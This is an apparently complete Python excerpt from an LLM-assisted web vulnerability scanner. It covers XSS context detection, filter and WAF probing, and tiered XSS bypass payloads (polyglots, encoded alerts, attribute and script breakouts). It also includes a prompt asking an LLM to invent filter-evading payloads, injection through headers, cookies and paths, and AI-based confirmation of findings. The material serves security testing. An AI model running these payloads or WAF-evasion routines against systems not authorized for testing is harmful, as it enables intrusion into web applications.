        before = body[max(0, idx - 150):idx]
        after = body[idx + len(canary):idx + len(canary) + 80]
        result["before_context"] = before
        result["after_context"] = after
        before_lower = before.lower()

        # Safe containers (block execution, need breakout)
        if re.search(r'<textarea[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "textarea"
            return result
        if re.search(r'<title[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "title"
            return result
        if re.search(r'<noscript[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "noscript"
            return result

        # HTML comment
        if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
            result["context"] = "html_comment"
            return result

        # SVG context
        if '<svg' in before_lower and '</svg>' not in before_lower[before_lower.rfind('<svg'):]:
            result["context"] = "svg_context"
            return result

        # MathML context
        if '<math' in before_lower and '</math>' not in before_lower[before_lower.rfind('<math'):]:
            result["context"] = "mathml_context"
            return result

        # Style block
        if re.search(r'<style[^>]*>[^<]*$', before_lower, re.DOTALL):
            result["context"] = "style"
            return result

        # JavaScript template literal (backtick string)
        if re.search(r'`[^`]*$', before):
            result["context"] = "js_template_literal"
            return result

        # Script context
        if re.search(r'<script[^>]*>[^<]*$', before_lower, re.DOTALL):
            if re.search(r"'[^']*$", before):
                result["context"] = "js_string_single"
                result["quote_char"] = "'"
            elif re.search(r'"[^"]*$', before):
                result["context"] = "js_string_double"
                result["quote_char"] = '"'
            else:
                result["context"] = "js_string_single"
            return result

        # Attribute context
        attr_match = re.search(
            r'<(\w+)\b[^>]*\s(\w[\w-]*)\s*=\s*(["\']?)([^"\']*?)$',
            before, re.IGNORECASE | re.DOTALL
        )
        if attr_match:
            result["enclosing_tag"] = attr_match.group(1).lower()
            result["attribute_name"] = attr_match.group(2).lower()
            result["quote_char"] = attr_match.group(3)

            if result["attribute_name"] in ("href", "action", "formaction"):
                result["context"] = "href"
            elif result["attribute_name"] == "src":
                result["context"] = "script_src"
            elif result["attribute_name"] in ("onclick", "onload", "onerror", "onfocus",
                                               "onmouseover", "onchange", "onsubmit"):
                result["context"] = "event_handler"
            elif result["quote_char"] == '"':
                result["context"] = "attribute_double"
            elif result["quote_char"] == "'":
                result["context"] = "attribute_single"
            else:
                result["context"] = "attribute_unquoted"
            return result

        # Default: HTML body
        result["context"] = "html_body"
        return result

    async def _detect_xss_filters(
        self, url: str, param: str, method: str = "GET",
        form_context: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """Probe target to detect which XSS characters, tags, and events are filtered.

        Works for both reflected (GET param) and stored (POST form + display page) via form_context.
        Returns filter_map with chars_allowed/blocked, tags_allowed/blocked, events_allowed/blocked.
        """
        filter_map: Dict[str, Any] = {
            "chars_allowed": [], "chars_blocked": [],
            "tags_allowed": [], "tags_blocked": [],
            "events_allowed": [], "events_blocked": [],
            "encoding_behavior": "unknown",
            "csp_policy": None,
            "waf_detected": False,
        }

        await self.log("info", f"    [FILTER] Probing character/tag/event filters...")

        async def _send_probe(probe_value: str) -> Optional[str]:
            """Send probe and return the body where output appears."""
            if form_context:
                text_fields = form_context.get("text_fields", [])
                details = form_context.get("input_details", [])
                action = form_context.get("action", url)
                fm = form_context.get("method", "POST")
                display_url = form_context.get("display_url", url)
                # Fetch fresh CSRF if needed
                if form_context.get("has_csrf"):
                    fetched = await self._fetch_fresh_form_values(
                        form_context.get("page_url", url), action
                    )
                    if fetched:
                        details = fetched
                data = self._build_form_data(details, text_fields, probe_value)
                resp = await self._make_request(action, fm, data)
                if resp and resp.get("status", 0) < 400:
                    disp = await self._make_request(display_url, "GET", {})
                    if disp:
                        return disp.get("body", "")
                return None
            else:
                probe_data = {param: probe_value}
                # Include form defaults for POST forms so all required fields are sent
                if hasattr(self, '_current_xss_form_defaults') and self._current_xss_form_defaults:
                    for k, v in self._current_xss_form_defaults.items():
                        if k != param:
                            probe_data[k] = v
                resp = await self._make_request(url, method, probe_data,
                                                 follow_redirects=method.upper() != "GET")
                return resp.get("body", "") if resp else None

        # Phase A: Character probing (batch — send all chars in one probe)
        test_chars = ['<', '>', '"', "'", '/', '(', ')', '`', '{', '}', ';', '=']
        batch_canary = f"nsc{hashlib.md5(url.encode()).hexdigest()[:4]}"
        batch_probe = ""
        for ch in test_chars:
            batch_probe += f"{batch_canary}{ch}"
        batch_probe += batch_canary

        body = await _send_probe(batch_probe)
        if body:
            for ch in test_chars:
                marker = f"{batch_canary}{ch}"
                if marker in body:
                    filter_map["chars_allowed"].append(ch)
                elif batch_canary in body:
                    filter_map["chars_blocked"].append(ch)
                    if ch == "<" and "&lt;" in body:
                        filter_map["encoding_behavior"] = "html_entity"
                else:
                    filter_map["chars_blocked"].append(ch)

            # Check CSP header
            csp_resp = await self._make_request(url, "GET", {})
            if csp_resp:
                headers = csp_resp.get("headers", {})
                csp = headers.get("Content-Security-Policy", "") or headers.get("content-security-policy", "")
                if csp:
                    filter_map["csp_policy"] = csp

        await self.log("info", f"    [FILTER] Chars allowed: {filter_map['chars_allowed']}, blocked: {filter_map['chars_blocked']}")

        # Phase B: Tag probing (only if < and > allowed)
        if "<" in filter_map["chars_allowed"] and ">" in filter_map["chars_allowed"]:
            test_tags = [
                "script", "img", "svg", "body", "input", "details", "video",
                "audio", "iframe", "a", "select", "textarea", "marquee",
                "math", "table", "style", "form", "button",
                "xss", "custom", "animatetransform", "set",
            ]
            for tag in test_tags:
                tc = f"nst{hashlib.md5(tag.encode()).hexdigest()[:4]}"
                probe = f"<{tag} {tc}=1>"
                body = await _send_probe(probe)
                if body and f"<{tag}" in body.lower():
                    filter_map["tags_allowed"].append(tag)
                else:
                    filter_map["tags_blocked"].append(tag)

            await self.log("info", f"    [FILTER] Tags allowed: {filter_map['tags_allowed']}")

            # Phase C: Event probing (using first allowed tag)
            if filter_map["tags_allowed"]:
                test_tag = filter_map["tags_allowed"][0]
                test_events = [
                    "onload", "onerror", "onfocus", "onblur", "onmouseover",
                    "onclick", "onmouseenter", "ontoggle", "onbegin",
                    "onanimationend", "onanimationstart", "onfocusin",
                    "onpointerover", "onpointerenter", "onpointerdown",
                    "onresize", "onscroll", "onwheel", "onhashchange", "onpageshow",
                ]
                for event in test_events:
                    ec = f"nse{hashlib.md5(event.encode()).hexdigest()[:4]}"
                    probe = f"<{test_tag} {event}={ec}>"
                    body = await _send_probe(probe)
                    if body and event in body.lower():
                        filter_map["events_allowed"].append(event)
                    else:
                        filter_map["events_blocked"].append(event)

                await self.log("info", f"    [FILTER] Events allowed: {filter_map['events_allowed']}")

        # WAF detection
        if body:
            waf_indicators = ["blocked", "forbidden", "waf", "firewall", "not acceptable"]
            if any(ind in body.lower() for ind in waf_indicators):
                filter_map["waf_detected"] = True
                await self.log("warning", f"    [FILTER] WAF/filter detected!")

        return filter_map

    def _escalation_payloads(self, filter_map: Dict, context: str) -> List[str]:
        """Build escalation payload list ordered by complexity, filtered by what's allowed.

        Tier 1: Direct payloads using allowed tags/events
        Tier 2: Encoding bypasses
        Tier 3: Alert alternatives
        Tier 4: Context-specific breakouts
        Tier 5: Polyglots
        """
        payloads: List[str] = []
        allowed_tags = filter_map.get("tags_allowed", [])
        allowed_events = filter_map.get("events_allowed", [])
        chars_allowed = filter_map.get("chars_allowed", [])

        # Tier 1: Direct payloads with allowed tag+event combos
        for tag in allowed_tags[:6]:
            for event in allowed_events[:6]:
                if tag == "svg" and event == "onload":
                    payloads.append("<svg onload=alert(1)>")
                elif tag == "body" and event == "onload":
                    payloads.append("<body onload=alert(1)>")
                elif event in ("onfocus", "onfocusin"):
                    payloads.append(f"<{tag} {event}=alert(1) autofocus tabindex=1>")
                elif event == "ontoggle" and tag == "details":
                    payloads.append("<details open ontoggle=alert(1)>")
                elif event == "onbegin":
                    payloads.append(f"<svg><animatetransform onbegin=alert(1)>")
                elif event == "onanimationend":
                    payloads.append(
                        f"<style>@keyframes x{{}}</style>"
                        f"<{tag} style=animation-name:x onanimationend=alert(1)>"
                    )
                else:
                    payloads.append(f"<{tag} {event}=alert(1)>")

        # Tier 2: Encoding/alt-syntax when parentheses or specific chars blocked
        if "(" not in chars_allowed and "`" in chars_allowed:
            for i, p in enumerate(list(payloads)[:5]):
                payloads.append(p.replace("alert(1)", "alert`1`"))

        if "<" not in chars_allowed:
            # Angle brackets blocked — attribute breakout payloads
            for q in ['"', "'"]:
                if q in chars_allowed:
                    payloads.extend([
                        f'{q} onfocus=alert(1) autofocus x={q}',
                        f'{q} onmouseover=alert(1) x={q}',
                        f'{q} autofocus onfocus=alert(1) x={q}',
                        f'{q}><img src=x onerror=alert(1)>',
                        f'{q}><svg onload=alert(1)>',
                    ])

        # Tier 3: Alert function alternatives
        alert_alternatives = [
            ("alert(1)", "confirm(1)"),
            ("alert(1)", "prompt(1)"),
            ("alert(1)", "print()"),
            ("alert(1)", "eval(atob('YWxlcnQoMSk='))"),
            ("alert(1)", "window['alert'](1)"),
            ("alert(1)", "Function('alert(1)')()"),
        ]
        base_payloads = list(payloads)[:3]
        for bp in base_payloads:
            for old, new in alert_alternatives[:3]:
                alt = bp.replace(old, new)
                if alt not in payloads:
                    payloads.append(alt)

        # Tier 4: Context-specific breakouts
        if context in ("js_string_single", "js_string_double"):
            quote = "'" if "single" in context else '"'
            payloads.extend([
                f"{quote};alert(1)//",
                f"{quote}-alert(1)-{quote}",
                f"</script><script>alert(1)</script>",
                f"</script><img src=x onerror=alert(1)>",
            ])
        if context == "js_template_literal":
            payloads.extend(["${alert(1)}", "${alert(document.domain)}"])
        if context == "href":
            payloads.extend([
                "javascript:alert(1)",
                "javascript:alert(document.domain)",
                "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
            ])
        if context in ("textarea", "title"):
            tag = "textarea" if context == "textarea" else "title"
            payloads.extend([
                f"</{tag}><script>alert(1)</script>",
                f"</{tag}><img src=x onerror=alert(1)>",
            ])
        if context == "attribute_double":
            payloads.extend(['" onfocus=alert(1) autofocus x="', '"><svg onload=alert(1)>'])
        if context == "attribute_single":
            payloads.extend(["' onfocus=alert(1) autofocus x='", "'><svg onload=alert(1)>"])

        # Tier 5: Polyglots
        payloads.extend([
            "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'-alert(1)-'",
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        ])

        # Deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    async def _ai_generate_xss_payloads(
        self,
        filter_map: Dict,
        context_info: Dict,
        challenge_hint: str = "",
        max_payloads: int = 10,
    ) -> List[str]:
        """Use LLM to generate custom XSS payloads based on filter analysis and context."""
        if not self.llm.is_available():
            return []

        await self.log("info", f"    [AI] Generating custom XSS payloads for context '{context_info.get('context', 'unknown')}'...")

        prompt = f"""You are an elite XSS researcher. Generate {max_payloads} XSS payloads to bypass the detected filters.

**Injection Context:** {context_info.get('context', 'unknown')}
**Before injection point:** ...{context_info.get('before_context', '')[-80:]}
**After injection point:** {context_info.get('after_context', '')[:40]}...
**Enclosing tag:** {context_info.get('enclosing_tag', 'none')}
**Attribute name:** {context_info.get('attribute_name', 'none')}
**Quote character:** {context_info.get('quote_char', 'none')}

**Filter Analysis:**
- Characters allowed: {filter_map.get('chars_allowed', [])}
- Characters blocked: {filter_map.get('chars_blocked', [])}
- Tags allowed: {filter_map.get('tags_allowed', [])}
- Tags blocked: {filter_map.get('tags_blocked', [])}
- Events allowed: {filter_map.get('events_allowed', [])}
- Events blocked: {filter_map.get('events_blocked', [])}
- Encoding: {filter_map.get('encoding_behavior', 'unknown')}
- CSP: {filter_map.get('csp_policy') or 'none'}

{"**Challenge Hint:** " + challenge_hint if challenge_hint else ""}

**Rules:**
1. ONLY use characters, tags, and events from the allowed lists
2. Each payload must trigger alert(1), alert(document.domain), or print()
3. For attribute context: break out with the correct quote char then add event handler
4. For JS string context: close the string and inject code
5. Try creative bypasses: backtick alert, eval(atob()), Function constructor
6. If no tags allowed but angle brackets allowed: try custom tags (<xss>, <custom>)
7. If nothing in allowed lists: try encoding bypasses

Respond with ONLY a JSON array of payload strings:
["payload1", "payload2", ...]"""

        try:
            response = await self.llm.generate(
                prompt,
                self._get_enhanced_system_prompt("testing", vuln_type="xss_reflected")
            )

            match = re.search(r'\[[\s\S]*?\]', response)
            if match:
                payloads = json.loads(match.group())
                if isinstance(payloads, list):
                    payloads = [p for p in payloads if isinstance(p, str) and len(p) > 0]
                    await self.log("info", f"    [AI] Generated {len(payloads)} custom payloads")
                    return payloads[:max_payloads]
        except Exception as e:
            await self.log("debug", f"    [AI] Payload generation failed: {e}")

        return []

    async def _browser_verify_stored_xss(self, form: Dict, payload: str,
                                          text_fields: List[str],
                                          display_url: str) -> Optional[Dict]:
        """Use Playwright browser to verify stored XSS with real form submission."""
        if not HAS_PLAYWRIGHT or BrowserValidator is None:
            return None

        try:
            validator = BrowserValidator(screenshots_dir="reports/screenshots")
            await validator.start(headless=True)
            try:
                # Build form_data with CSS selectors for Playwright
                browser_form_data = {}
                for inp in form.get("inputs", []):
                    selector = f"[name='{inp}']"
                    if inp in text_fields:
                        browser_form_data[selector] = payload
                    elif inp.lower() in ("email",):
                        browser_form_data[selector] = "test@test.com"
                    elif inp.lower() in ("website", "url"):
                        browser_form_data[selector] = "http://test.com"
                    elif inp.lower() in ("name",):
                        browser_form_data[selector] = "TestUser"
                    else:
                        browser_form_data[selector] = "test"

                finding_id = hashlib.md5(
                    f"stored_xss_{form.get('action', '')}_{payload[:20]}".encode()
                ).hexdigest()[:12]

                result = await validator.verify_stored_xss(
                    finding_id=finding_id,
                    form_url=form.get("page_url", form.get("action", "")),
                    form_data=browser_form_data,
                    display_url=display_url,
                    timeout=20000
                )
                return result
            finally:
                await validator.stop()
        except Exception as e:
            await self.log("debug", f"    Browser stored XSS verification failed: {e}")
            return None

    def _get_request_timeout(self) -> aiohttp.ClientTimeout:
        """Get request timeout, very short if cancelled for fast stop."""
        if self._cancelled:
            return aiohttp.ClientTimeout(total=0.1)
        return aiohttp.ClientTimeout(total=10)

    async def _make_request(self, url: str, method: str, params: Dict,
                            follow_redirects: bool = False) -> Optional[Dict]:
        """Make HTTP request with resilient request engine (retry, rate limiting, circuit breaker)"""
        if self.is_cancelled():
            return None
        try:
            if self.request_engine:
                result = await self.request_engine.request(
                    url, method=method.upper(),
                    params=params if method.upper() == "GET" else None,
                    data=params if method.upper() != "GET" else None,
                    allow_redirects=follow_redirects,
                )
                if result:
                    return {
                        "status": result.status,
                        "body": result.body,
                        "headers": result.headers,
                        "url": result.url,
                    }
                return None
            # Fallback: direct session (no request_engine)
            timeout = self._get_request_timeout()
            m = method.upper()
            req_kwargs = {"allow_redirects": follow_redirects, "timeout": timeout}
            if m == "GET":
                req_kwargs["params"] = params
            else:
                req_kwargs["data"] = params
            # Support all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)
            async with self.session.request(m, url, **req_kwargs) as resp:
                body = await resp.text()
                return {
                    "status": resp.status,
                    "body": body,
                    "headers": dict(resp.headers),
                    "url": str(resp.url)
                }
        except Exception as e:
            return None

    async def _make_request_with_injection(
        self, url: str, method: str, payload: str,
        injection_point: str = "parameter",
        param_name: str = "id",
        header_name: str = "",
        cookie_name: str = ""
    ) -> Optional[Dict]:
        """Make HTTP request with payload injected into the correct location.

        injection_point: "parameter" | "header" | "cookie" | "body" | "path"
        Uses RequestEngine for retry, rate limiting, and circuit breaker.
        """
        if self.is_cancelled():
            return None
        headers = {}
        params = {}
        cookies = {}
        data = None

        if injection_point == "header":
            headers[header_name or "X-Forwarded-For"] = payload
        elif injection_point == "cookie":
            cookies[cookie_name or "session"] = payload
        elif injection_point == "body":
            data = payload if isinstance(payload, str) and payload.strip().startswith("<?xml") else {param_name: payload}
        elif injection_point == "path":
            url = url.rstrip("/") + "/" + payload
        else:  # "parameter" (default)
            params = {param_name: payload}

        content_type_header = {}
        if injection_point == "body" and isinstance(data, str):
            content_type_header = {"Content-Type": "application/xml"}
        merged_headers = {**headers, **content_type_header}

        try:
            if self.request_engine:
                # Adapt payload for WAF bypass if WAF detected
                if self._waf_result and self._waf_result.detected_wafs:
                    waf_name = self._waf_result.detected_wafs[0].name
                    # Only adapt parameter/body payloads (not headers/cookies)
                    if injection_point in ("parameter", "body"):
                        adapted = self.waf_detector.adapt_payload(payload, waf_name, "generic")
                        if adapted and adapted[0] != payload:
                            payload = adapted[0]
                            # Re-apply injection point with adapted payload
                            if injection_point == "body":
                                data = payload if isinstance(payload, str) and payload.strip().startswith("<?xml") else {param_name: payload}
                            else:
                                params = {param_name: payload}

                result = await self.request_engine.request(
                    url, method=method.upper(),
                    params=params if method.upper() == "GET" else None,
                    data=data if isinstance(data, str) else (data or params) if method.upper() != "GET" else None,
                    headers=merged_headers if merged_headers else None,
                    cookies=cookies if cookies else None,
                    allow_redirects=False,
                )
                if result:
                    resp_dict = {
                        "status": result.status, "body": result.body,
                        "headers": result.headers, "url": result.url,
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
                    # Record result in strategy adapter
                    if self.strategy:
                        self.strategy.record_test_result(
                            url, "", result.status, result.error_type == ErrorType.SUCCESS,
                            result.response_time
                        )
                    return resp_dict
                return None

            # Fallback: direct session (no request_engine)
            timeout = self._get_request_timeout()
            if method.upper() == "GET":
                async with self.session.get(
                    url, params=params, headers=merged_headers,
                    cookies=cookies, allow_redirects=False, timeout=timeout
                ) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status, "body": body,
                        "headers": dict(resp.headers), "url": str(resp.url),
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
            else:
                post_data = data if isinstance(data, str) else (data or params)
                async with self.session.post(
                    url, data=post_data, headers=merged_headers,
                    cookies=cookies, allow_redirects=False, timeout=timeout
                ) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status, "body": body,
                        "headers": dict(resp.headers), "url": str(resp.url),
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
        except Exception:
            return None

    def _is_response_valid(self, response: Dict) -> bool:
        """Check if the HTTP response indicates a functional application.
        Rejects error pages, connection failures, and non-functional states."""
        status = response.get('status', 0)
        body = response.get('body', '')

        # No response at all
        if not body and status == 0:
            return False

        # Server errors (5xx) - application is not working properly
        if 500 <= status <= 599:
            return False

        # Empty or very short body might indicate the app isn't processing input
        if len(body.strip()) < 10:
            return False

        # Generic error page indicators (not DB errors - those are intentional for sqli)
        body_lower = body.lower()
        non_functional_indicators = [
            "502 bad gateway", "503 service unavailable",
            "504 gateway timeout", "connection refused",
            "could not connect", "service is unavailable",
            "application is not available", "maintenance mode",
        ]
        for indicator in non_functional_indicators:
            if indicator in body_lower:
                return False

        return True

    async def _verify_vulnerability(self, vuln_type: str, payload: str,
                                     response: Dict, baseline: Optional[Dict] = None) -> Tuple[bool, str]:
        """Verify vulnerability using multi-signal verification (XBOW-inspired)"""
        # First check: is the response from a functional application?
        if not self._is_response_valid(response):
            return False, ""

        body = response.get('body', '')
        status = response.get('status', 0)
        headers = response.get('headers', {})

        # Get VulnEngine tester result
        mapped_type = self._map_vuln_type(vuln_type)
        tester = self.vuln_registry.get_tester(mapped_type)

        try:
            tester_result = tester.analyze_response(
                payload, status, headers, body, context={}
            )
        except Exception as e:
            await self.log("debug", f"  Tester error for {mapped_type}: {e}")
            tester_result = (False, 0.0, None)

        # Multi-signal verification
        confirmed, evidence, signal_count = self.response_verifier.multi_signal_verify(
            vuln_type, payload, response, baseline, tester_result
        )

        if confirmed:
            await self.log("debug", f"  Multi-signal confirmed ({signal_count} signals): {evidence[:100]}")
            return True, evidence

        # If 1 signal found but low confidence, still return True to let AI confirm
        if signal_count == 1 and evidence:
            await self.log("debug", f"  Single signal, needs AI: {evidence[:100]}")
            return True, evidence

        return False, ""

    def _normalize_endpoint_for_rag(self, endpoint: str) -> str:
        """Normalize endpoint for RAG storage (remove IDs, UUIDs)."""
        import re
        normalized = re.sub(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', '/{uuid}', endpoint)
        normalized = re.sub(r'/\d+', '/{id}', normalized)
        return normalized

    def _get_rag_testing_context(self, vuln_type: str, url: str = "",
                                   param: str = "") -> str:
        """Get RAG-enhanced context for vulnerability testing.
        Combines few-shot examples + reasoning template + retrieved knowledge.
        """
        context_parts = []

        tech = ", ".join(self.recon.technologies[:3]) if self.recon.technologies else ""

        # 1. Few-shot examples (real-world reasoning demonstrations)
        if self.few_shot_selector:
            try:
                examples = self.few_shot_selector.get_testing_examples(
                    vuln_type, technology=tech, max_examples=2
                )
                if examples:
                    context_parts.append(examples)
            except Exception:
                pass

        # 2. Reasoning template (structured CoT framework)
        if HAS_RAG:
            try:
                template = format_reasoning_prompt(vuln_type, include_pitfalls=True)
                if template:
                    context_parts.append(template)
            except Exception:
                pass

        # 3. RAG retrieved knowledge (semantic search)
        if self.rag_engine:
            try:
                rag_ctx = self.rag_engine.get_testing_context(
                    vuln_type, target_url=url,
                    technology=tech, parameter=param,
                    max_chars=1500
                )
                if rag_ctx:
                    context_parts.append(rag_ctx)
            except Exception:
                pass

        # 4. Reasoning memory (past successes/failures)
        if self.reasoning_memory:
            try:
                memory_ctx = self.reasoning_memory.get_context_for_testing(
                    vuln_type, technology=tech, max_chars=800
                )
                if memory_ctx:
                    context_parts.append(memory_ctx)
            except Exception:
                pass

        return "\n".join(context_parts)

    def _extract_signal_names(self, evidence: str) -> List[str]:
        """Extract signal names from evidence string (e.g., 'baseline_diff', 'payload_effect')."""
        signals = []
        evidence_lower = evidence.lower() if evidence else ""
        if "response diff:" in evidence_lower or "length delta" in evidence_lower:
            signals.append("baseline_diff")
        if "new error patterns:" in evidence_lower:
            signals.append("new_errors")
        if any(kw in evidence_lower for kw in
               ["payload in", "sql error", "file content", "command output",
                "template expression", "xss payload", "reflected", "injected header",
                "redirect to"]):
            signals.append("payload_effect")
        if "pattern match" in evidence_lower or "tester_match" in evidence_lower:
            signals.append("tester_match")
        return signals if signals else ["unknown"]

    async def _judge_finding(self, vuln_type: str, url: str, param: str,
                              payload: str, evidence: str, test_resp: Dict,
                              baseline: Optional[Dict] = None,
                              method: str = "GET",
                              injection_point: str = "parameter") -> Optional[Finding]:
        """Run ValidationJudge pipeline and create/reject finding accordingly.

        Returns Finding if approved, None if rejected (rejection stored internally).
        """
        # RAG: Enrich evidence with verification context (few-shot verification examples)
        rag_verification_ctx = ""
        if self.rag_engine or self.few_shot_selector:
            try:
                parts = []
                if self.few_shot_selector:
                    verification_examples = self.few_shot_selector.get_verification_examples(
                        vuln_type, evidence=evidence[:200], max_examples=2
                    )
                    if verification_examples:
                        parts.append(verification_examples)
                if self.rag_engine:
                    tech = ", ".join(self.recon.technologies[:3]) if self.recon.technologies else ""
                    rag_verif = self.rag_engine.get_verification_context(
                        vuln_type, evidence=evidence[:300],
                        technology=tech, max_chars=1000
                    )
                    if rag_verif:
                        parts.append(rag_verif)
                rag_verification_ctx = "\n".join(parts)
            except Exception:
                pass

        # Append RAG context to evidence for judge consideration
        enriched_evidence = evidence
        if rag_verification_ctx:
            enriched_evidence = f"{evidence}\n\n{rag_verification_ctx}"

        signals = self._extract_signal_names(evidence)

        judgment = await self.validation_judge.evaluate(
            vuln_type, url, param, payload, test_resp, baseline,
            signals, enriched_evidence, self._make_request, method, injection_point
        )

        await self.log("info", f"    [JUDGE] {vuln_type} | score={judgment.confidence_score}/100 "
                       f"| verdict={judgment.verdict}")

        # Apply adaptive learner hints: penalty for known FP patterns
        if self.adaptive_learner and judgment.approved:
            try:
                domain = urlparse(url).netloc
                hints = self.adaptive_learner.get_evaluation_hints(
                    vuln_type, url, param,
                    test_resp.get("body", "") if isinstance(test_resp, dict) else ""
                )
                if hints.get("likely_false_positive"):
                    penalty = hints.get("confidence_penalty", 20)
                    judgment.confidence_score = max(0, judgment.confidence_score - penalty)
                    await self.log("info", f"    [LEARNER] FP pattern detected: -{penalty} confidence "
                                   f"(pattern: {hints.get('pattern_type', 'unknown')})")
                    if judgment.confidence_score < 60:
                        judgment.approved = False
                        judgment.verdict = "rejected"
                        judgment.rejection_reason = f"Adaptive learner FP pattern: {hints.get('pattern_type', '')}"
            except Exception:
                pass

        # Record outcome in access control learner for adaptive learning
        if self.access_control_learner:
            try:
                resp_body = test_resp.get("body", "") if isinstance(test_resp, dict) else ""
                resp_status = test_resp.get("status", 0) if isinstance(test_resp, dict) else 0
                self.access_control_learner.record_test(
                    vuln_type=vuln_type,
                    target_url=url,
                    status_code=resp_status,
                    response_body=resp_body,
                    is_true_positive=judgment.approved,
                    pattern_notes=f"score={judgment.confidence_score} verdict={judgment.verdict}"
                )
            except Exception:
                pass

        if not judgment.approved:
            await self.log("debug", f"    [JUDGE] Rejected: {judgment.rejection_reason}")
            await self._store_rejected_finding(
                vuln_type, url, param, payload,
                judgment.evidence_summary, test_resp
            )
            # Update rejection reason with judge's detailed reason
            if self.rejected_findings:
                self.rejected_findings[-1].rejection_reason = judgment.rejection_reason
                self.rejected_findings[-1].confidence_score = judgment.confidence_score
                self.rejected_findings[-1].confidence = str(judgment.confidence_score)
                self.rejected_findings[-1].confidence_breakdown = judgment.confidence_breakdown

            # RAG: Record failure pattern for future avoidance
            if self.reasoning_memory and HAS_RAG:
                try:
                    failure = FailureRecord(
                        vuln_type=vuln_type,
                        technology=", ".join(self.recon.technologies[:3]) if self.recon.technologies else "unknown",
                        endpoint_pattern=self._normalize_endpoint_for_rag(url),
                        attempted_payloads=[payload] if payload else [],
                        failure_reason=judgment.rejection_reason or "rejected"
                    )
                    self.reasoning_memory.record_failure(failure)
                except Exception:
                    pass

            return None

        # Approved — create finding
        finding = self._create_finding(
            vuln_type, url, param, payload,
            judgment.evidence_summary, test_resp,
            ai_confirmed=(judgment.confidence_score >= 90)
        )
        finding.confidence_score = judgment.confidence_score
        finding.confidence = str(judgment.confidence_score)
        finding.confidence_breakdown = judgment.confidence_breakdown
        if judgment.proof_of_execution:
            finding.proof_of_execution = judgment.proof_of_execution.detail
        if judgment.negative_controls:
            finding.negative_controls = judgment.negative_controls.detail

        # Request Repeater validation: reproducibility check
        if HAS_REQUEST_REPEATER and self.request_repeater and self.session:
            try:
                repeater_result = await self.request_repeater.validate_finding(
                    finding, session=self.session, retries=2
                )
                if repeater_result:
                    if repeater_result.reproducible:
                        boost = min(15, repeater_result.confidence_boost)
                        finding.confidence_score = min(100, finding.confidence_score + boost)
                        finding.confidence = str(finding.confidence_score)
                        await self.log("info", f"    [REPEATER] Reproducible (+{boost}): "
                                       f"{repeater_result.analysis[:80]}")
                    else:
                        await self.log("info", f"    [REPEATER] Not reproducible: "
                                       f"{repeater_result.analysis[:80]}")
                    # Store analysis in evidence
                    if repeater_result.analysis:
                        finding.evidence = (
                            f"{finding.evidence or ''} | [Repeater] {repeater_result.analysis[:150]}"
                        )
            except Exception as e:
                await self.log("debug", f"    [REPEATER] Validation error: {e}")

        return finding

    async def _ai_confirm_finding(self, vuln_type: str, url: str, param: str,
                                   payload: str, response: str, evidence: str) -> bool:
        """Use AI to confirm finding and reduce false positives (LEGACY - kept for fallback)"""
        # If LLM not available, rely on strict technical verification only
        if not self.llm.is_available():
            await self.log("debug", f"  LLM not available - using strict technical verification for {vuln_type}")
            # Without AI confirmation, apply stricter criteria
            return self._strict_technical_verify(vuln_type, payload, response, evidence)

        # Inject access control learning context for BOLA/BFLA/IDOR types
        acl_learning_hint = ""
        acl_types = {"bola", "bfla", "idor", "privilege_escalation", "auth_bypass",
                     "forced_browsing", "broken_auth", "mass_assignment", "account_takeover"}
        if vuln_type in acl_types and self.access_control_learner:
            try:
                domain = urlparse(url).netloc
                acl_ctx = self.access_control_learner.get_learning_context(vuln_type, domain)
                if acl_ctx:
                    acl_learning_hint = f"\n{acl_ctx}\n"
                hints = self.access_control_learner.get_evaluation_hints(
                    vuln_type, response if isinstance(response, str) else "", 200
                )
                if hints and hints.get("likely_false_positive"):
                    acl_learning_hint += (
                        f"\nWARNING: Learned patterns suggest this is LIKELY A FALSE POSITIVE "
                        f"(pattern: {hints['pattern_type']}, FP signals: {hints['fp_signals']})\n"
                    )
            except Exception:
                pass

        prompt = f"""Analyze this potential {vuln_type.upper()} vulnerability and determine if it's REAL or a FALSE POSITIVE.

**Target Information:**
- URL: {url}
- Vulnerable Parameter: {param}
- Payload Used: {payload}
- Evidence Found: {evidence}

**Response Excerpt:**
```
{response[:1500]}
```
{acl_learning_hint}
**Vulnerability-Specific Analysis Required:**

For {vuln_type.upper()}, confirm ONLY if:
{"- The injected SQL syntax causes a database error OR returns different data than normal input" if vuln_type == "sqli" else ""}
{"- The JavaScript payload appears UNESCAPED in the response body (not just reflected)" if vuln_type == "xss" else ""}
{"- The file content (e.g., /etc/passwd, win.ini) appears in the response" if vuln_type == "lfi" else ""}
{"- The template expression was EVALUATED (e.g., 7*7 became 49, not {{7*7}})" if vuln_type == "ssti" else ""}
{"- Internal/cloud resources were accessed (metadata, localhost content)" if vuln_type == "ssrf" else ""}
{"- Command output (uid=, gid=, directory listing) appears in response" if vuln_type == "rce" else ""}
{"- CRITICAL: Do NOT check status codes. Compare actual response DATA. Does the response contain a DIFFERENT user's private data (email, phone, address, orders)? If it shows empty body, error message, login page, or YOUR OWN data → FALSE POSITIVE." if vuln_type in acl_types else ""}

**Critical Questions:**
1. Does the evidence show the vulnerability being EXPLOITED, not just reflected?
2. Is there definitive proof of unsafe processing?
3. Could this evidence be normal application behavior or sanitized output?
4. Is the HTTP response a proper application response (not a generic error page or 404)?

